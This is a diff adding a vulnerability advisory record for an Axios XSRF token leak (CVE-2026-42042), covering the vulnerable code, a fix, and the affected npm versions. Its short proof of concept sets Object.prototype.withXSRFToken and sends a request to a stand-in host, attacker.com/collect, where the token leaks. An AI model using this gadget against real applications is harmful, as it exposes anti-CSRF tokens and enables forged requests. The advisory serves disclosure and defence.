@@ -1,0 +1,320 @@
+advisory_id: GHSA-xx6v-rp6x-q39c
+datasource_id: github_osv/GHSA-xx6v-rp6x-q39c
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-xx6v-rp6x-q39c/GHSA-xx6v-rp6x-q39c.json
+aliases:
+  - CVE-2026-42042
+summary: |
+  Axios: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in `withXSRFToken` Boolean Coercion
+  # Vulnerability Disclosure: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in `withXSRFToken` Boolean Coercion
+
+  ## Summary
+
+  The Axios library's XSRF token protection logic uses JavaScript truthy/falsy semantics instead of strict boolean comparison for the `withXSRFToken` config property. When this property is set to any truthy non-boolean value (via prototype pollution or misconfiguration), the same-origin check (`isURLSameOrigin`) is **short-circuited**, causing XSRF tokens to be sent to **all** request targets including cross-origin servers controlled by an attacker.
+
+  **Severity:** Medium (CVSS 5.4)
+  **Affected Versions:** All versions since `withXSRFToken` was introduced
+  **Vulnerable Component:** `lib/helpers/resolveConfig.js:59`
+  **Environment:** Browser-only (XSRF logic only runs when `hasStandardBrowserEnv` is true)
+
+  ## CWE
+
+  - **CWE-201:** Insertion of Sensitive Information Into Sent Data
+  - **CWE-183:** Permissive List of Allowed Inputs
+
+  ## CVSS 3.1
+
+  **Score: 5.4 (Medium)**
+
+  Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`
+
+  | Metric | Value | Justification |
+  |---|---|---|
+  | Attack Vector | Network | PP triggered remotely via vulnerable dependency |
+  | Attack Complexity | Low | Once PP exists, single property assignment. Consistent with GHSA-fvcv-3m26-pcqx |
+  | Privileges Required | None | No authentication needed |
+  | User Interaction | Required | Victim must use browser with axios making cross-origin requests |
+  | Scope | Unchanged | Token leakage within browser context |
+  | Confidentiality | Low | XSRF token leaked — anti-CSRF token, not session token |
+  | Integrity | Low | Stolen XSRF token enables CSRF attacks (bypass CSRF protection only) |
+  | Availability | None | No availability impact |
+
+  ## Usage of "Helper" Vulnerabilities
+
+  This vulnerability requires **Zero Direct User Input** when triggered via prototype pollution.
+
+  If an attacker can pollute `Object.prototype.withXSRFToken` with any truthy value (e.g., `1`, `"true"`, `{}`), Axios will automatically inherit this value during config merge. The truthy value short-circuits the same-origin check, causing the XSRF cookie value to be sent as a request header to every destination.
+
+  ## Vulnerable Code
+
+  **File:** `lib/helpers/resolveConfig.js`, lines 57-66
+
+  ```javascript
+  // Line 57: Function check — only applies if withXSRFToken is a function
+  withXSRFToken && utils.isFunction(withXSRFToken) && (withXSRFToken = withXSRFToken(newConfig));
+
+  // Line 59: The vulnerable condition
+  if (withXSRFToken || (withXSRFToken !== false && isURLSameOrigin(newConfig.url))) {
+  //  ^^^^^^^^^^^^^^^^
+  //  When withXSRFToken = 1 (truthy non-boolean): this is true → short-circuits
+  //  isURLSameOrigin() is NEVER called → token sent to ANY origin
+    const xsrfValue = xsrfHeaderName && xsrfCookieName && cookies.read(xsrfCookieName);
+    if (xsrfValue) {
+      headers.set(xsrfHeaderName, xsrfValue);
+    }
+  }
+  ```
+
+  **Designed behavior:**
+  - `true` → always send token (explicit cross-origin opt-in)
+  - `false` → never send token
+  - `undefined` → send only for same-origin requests
+
+  **Actual behavior for non-boolean truthy values (`1`, `"false"`, `{}`, `[]`):**
+  - All treated as truthy → same-origin check skipped → token sent everywhere
+
+  ## Proof of Concept
+
+  ```javascript
+  // Simulated prototype pollution from any vulnerable dependency
+  Object.prototype.withXSRFToken = 1;
+
+  // In browser with document.cookie = "XSRF-TOKEN=secret-csrf-token-abc123"
+  // Every axios request now includes: X-XSRF-TOKEN: secret-csrf-token-abc123
+  // Even to cross-origin hosts:
+  await axios.get('https://attacker.com/collect');
+  // → attacker receives the XSRF token in request headers
+  ```
+
+  ## Verified PoC Output
+
+  ```
+  withXSRFToken Value        Sends Token Cross-Origin  Expected
+  true (boolean)             YES                       Yes (opt-in)
+  false (boolean)            No                        No
+  undefined (default)        No                        No
+  1 (number)                 YES ← BUG                No
+  "false" (string)           YES ← BUG                No
+  {} (object)                YES ← BUG                No
+  [] (array)                 YES ← BUG                No
+
+  Prototype pollution:
+    Object.prototype.withXSRFToken = 1
+    config.withXSRFToken = 1 → leaks=true
+    isURLSameOrigin() was NOT called (short-circuited)
+  ```
+
+  ## Impact Analysis
+
+  - **XSRF Token Theft:** Anti-CSRF token sent as header to attacker-controlled server, enabling CSRF attacks against the victim application
+  - **Universal Scope:** A single `Object.prototype.withXSRFToken = 1` affects every axios request in the application
+  - **Misconfiguration Risk:** Developer writing `withXSRFToken: "false"` (string) instead of `false` (boolean) triggers the same issue without PP
+
+  **Limitations:**
+  - Browser-only (XSRF logic runs only in `hasStandardBrowserEnv`)
+  - XSRF tokens are anti-CSRF tokens, not session tokens — leakage enables CSRF but not direct session hijacking
+  - Attacker still needs a way to deliver the forged request after obtaining the token
+
+  ## Recommended Fix
+
+  Use strict boolean comparison:
+
+  ```javascript
+  // FIXED: lib/helpers/resolveConfig.js
+  const shouldSendXSRF = withXSRFToken === true ||
+    (withXSRFToken == null && isURLSameOrigin(newConfig.url));
+
+  if (shouldSendXSRF) {
+    const xsrfValue = xsrfHeaderName && xsrfCookieName && cookies.read(xsrfCookieName);
+    if (xsrfValue) {
+      headers.set(xsrfHeaderName, xsrfValue);
+    }
+  }
+  ```
+
+  ## Resources
+
+  - [CWE-201: Insertion of Sensitive Information Into Sent Data](https://cwe.mitre.org/data/definitions/201.html)
+  - [CWE-183: Permissive List of Allowed Inputs](https://cwe.mitre.org/data/definitions/183.html)
+  - [GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios](https://github.com/advisories/GHSA-fvcv-3m26-pcqx)
+  - [Axios GitHub Repository](https://github.com/axios/axios)
+
+  ## Timeline
+
+  | Date | Event |
+  |---|---|
+  | 2026-04-15 | Vulnerability discovered during source code audit |
+  | 2026-04-16 | Report revised: corrected CVSS, documented limitations |
+  | TBD | Report submitted to vendor via GitHub Security Advisory |
+impacted_packages:
+  - purl: pkg:npm/axios
+    affected_versions: vers:npm/>=1.0.0|<1.15.1
+    fixed_versions: vers:npm/1.15.1
+    affected_packages:
+      - pkg:npm/axios@1.0.0
+      - pkg:npm/axios@1.1.0
+      - pkg:npm/axios@1.1.1
+      - pkg:npm/axios@1.1.2
+      - pkg:npm/axios@1.1.3
+      - pkg:npm/axios@1.2.0-alpha.1
+      - pkg:npm/axios@1.2.0
+      - pkg:npm/axios@1.2.1
+      - pkg:npm/axios@1.2.2
+      - pkg:npm/axios@1.2.3
+      - pkg:npm/axios@1.2.4
+      - pkg:npm/axios@1.2.5
+      - pkg:npm/axios@1.2.6
+      - pkg:npm/axios@1.3.0
+      - pkg:npm/axios@1.3.1
+      - pkg:npm/axios@1.3.2
+      - pkg:npm/axios@1.3.3
+      - pkg:npm/axios@1.3.4
+      - pkg:npm/axios@1.3.5
+      - pkg:npm/axios@1.3.6
+      - pkg:npm/axios@1.4.0
+      - pkg:npm/axios@1.5.0
+      - pkg:npm/axios@1.5.1
+      - pkg:npm/axios@1.6.0
+      - pkg:npm/axios@1.6.1
+      - pkg:npm/axios@1.6.2
+      - pkg:npm/axios@1.6.3
+      - pkg:npm/axios@1.6.4
+      - pkg:npm/axios@1.6.5
+      - pkg:npm/axios@1.6.6
+      - pkg:npm/axios@1.6.7
+      - pkg:npm/axios@1.6.8
+      - pkg:npm/axios@1.7.0-beta.0
+      - pkg:npm/axios@1.7.0-beta.1
+      - pkg:npm/axios@1.7.0-beta.2
+      - pkg:npm/axios@1.7.0
+      - pkg:npm/axios@1.7.1
+      - pkg:npm/axios@1.7.2
+      - pkg:npm/axios@1.7.3
+      - pkg:npm/axios@1.7.4
+      - pkg:npm/axios@1.7.5
+      - pkg:npm/axios@1.7.6
+      - pkg:npm/axios@1.7.7
+      - pkg:npm/axios@1.7.8
+      - pkg:npm/axios@1.7.9
+      - pkg:npm/axios@1.8.0
+      - pkg:npm/axios@1.8.1
+      - pkg:npm/axios@1.8.2
+      - pkg:npm/axios@1.8.3
+      - pkg:npm/axios@1.8.4
+      - pkg:npm/axios@1.9.0
+      - pkg:npm/axios@1.10.0
+      - pkg:npm/axios@1.11.0
+      - pkg:npm/axios@1.12.0
+      - pkg:npm/axios@1.12.1
+      - pkg:npm/axios@1.12.2
+      - pkg:npm/axios@1.13.0
+      - pkg:npm/axios@1.13.1
+      - pkg:npm/axios@1.13.2
+      - pkg:npm/axios@1.13.3
+      - pkg:npm/axios@1.13.4
+      - pkg:npm/axios@1.13.5
+      - pkg:npm/axios@1.13.6
+      - pkg:npm/axios@1.14.0
+      - pkg:npm/axios@1.15.0
+    fixed_packages:
+      - pkg:npm/axios@1.15.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/axios
+    affected_versions: vers:npm/<=0.31.0
+    fixed_versions: vers:npm/0.31.1
+    affected_packages:
+      - pkg:npm/axios@0.1.0
+      - pkg:npm/axios@0.2.0
+      - pkg:npm/axios@0.2.1
+      - pkg:npm/axios@0.2.2
+      - pkg:npm/axios@0.3.0
+      - pkg:npm/axios@0.3.1
+      - pkg:npm/axios@0.4.0
+      - pkg:npm/axios@0.4.1
+      - pkg:npm/axios@0.4.2
+      - pkg:npm/axios@0.5.0
+      - pkg:npm/axios@0.5.1
+      - pkg:npm/axios@0.5.2
+      - pkg:npm/axios@0.5.3
+      - pkg:npm/axios@0.5.4
+      - pkg:npm/axios@0.6.0
+      - pkg:npm/axios@0.7.0
+      - pkg:npm/axios@0.8.0
+      - pkg:npm/axios@0.8.1
+      - pkg:npm/axios@0.9.0
+      - pkg:npm/axios@0.9.1
+      - pkg:npm/axios@0.10.0
+      - pkg:npm/axios@0.11.0
+      - pkg:npm/axios@0.11.1
+      - pkg:npm/axios@0.12.0
+      - pkg:npm/axios@0.13.0
+      - pkg:npm/axios@0.13.1
+      - pkg:npm/axios@0.14.0
+      - pkg:npm/axios@0.15.0
+      - pkg:npm/axios@0.15.1
+      - pkg:npm/axios@0.15.2
+      - pkg:npm/axios@0.15.3
+      - pkg:npm/axios@0.16.0
+      - pkg:npm/axios@0.16.1
+      - pkg:npm/axios@0.16.2
+      - pkg:npm/axios@0.17.0
+      - pkg:npm/axios@0.17.1
+      - pkg:npm/axios@0.18.0
+      - pkg:npm/axios@0.18.1
+      - pkg:npm/axios@0.19.0-beta.1
+      - pkg:npm/axios@0.19.0
+      - pkg:npm/axios@0.19.1
+      - pkg:npm/axios@0.19.2
+      - pkg:npm/axios@0.20.0-0
+      - pkg:npm/axios@0.20.0
+      - pkg:npm/axios@0.21.0
+      - pkg:npm/axios@0.21.1
+      - pkg:npm/axios@0.21.2
+      - pkg:npm/axios@0.21.3
+      - pkg:npm/axios@0.21.4
+      - pkg:npm/axios@0.22.0
+      - pkg:npm/axios@0.23.0
+      - pkg:npm/axios@0.24.0
+      - pkg:npm/axios@0.25.0
+      - pkg:npm/axios@0.26.0
+      - pkg:npm/axios@0.26.1
+      - pkg:npm/axios@0.27.0
+      - pkg:npm/axios@0.27.1
+      - pkg:npm/axios@0.27.2
+      - pkg:npm/axios@0.28.0
+      - pkg:npm/axios@0.28.1
+      - pkg:npm/axios@0.29.0
+      - pkg:npm/axios@0.30.0
+      - pkg:npm/axios@0.30.1
+      - pkg:npm/axios@0.30.2
+      - pkg:npm/axios@0.30.3
+      - pkg:npm/axios@0.31.0
+    fixed_packages:
+      - pkg:npm/axios@0.31.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-xx6v-rp6x-q39c/GHSA-xx6v-rp6x-q39c.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-183
+  - CWE-201
+references:
+  - url: https://github.com/axios/axios
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-42042
+    reference_type:
+    reference_id: CVE-2026-42042
+  - url: https://github.com/axios/axios/security/advisories/GHSA-xx6v-rp6x-q39c
+    reference_type:
+    reference_id: GHSA-xx6v-rp6x-q39c
+exploits: []
